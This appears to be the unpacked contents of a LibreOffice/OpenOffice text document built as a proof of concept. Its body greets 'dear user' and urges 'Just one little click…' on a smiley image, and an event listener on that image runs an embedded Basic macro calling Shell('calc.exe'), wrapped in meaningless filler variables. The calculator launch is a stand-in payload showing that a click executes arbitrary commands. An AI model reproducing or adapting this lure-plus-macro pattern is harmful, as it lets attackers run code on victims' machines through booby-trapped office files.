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test.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/test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600000144F18F077F0CD46E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d21c" officeooo:paragraph-rsid="0004d21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Hello dear user,</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:width="3.4in" svg:height="2.9453in" draw:z-index="0"><draw:image xlink:href="Pictures/100002010000017600000144F18F077F0CD46E45.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" loext:mime-type="image/png"/><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:select" xlink:href="vnd.sun.star.script:Standard.test.Main?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></draw:frame>Click the smiley</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Just one little click…</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">- hack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8T22:07:17.881844343</meta:creation-date>
    <dc:date>2020-08-13T08:41:28.681752185</dc:date>
    <meta:editing-duration>PT11M3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4" meta:word-count="12" meta:character-count="62" meta:non-whitespace-character-count="54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  <library:element library:name="test2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>Sub Main
  If WsGQFM Or 2 Then
    tBFjh = "TI"
  End If
  Shell("calc.exe")
End Sub

      </script:module>
</file>

<file path=Basic/Standard/test2.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="test2" script:language="StarBasic" script:moduleType="normal">Sub Main
  If WsGQFM Or 1 Then
    tBFjh = "TI"
  End If
  Shell("calc.exe")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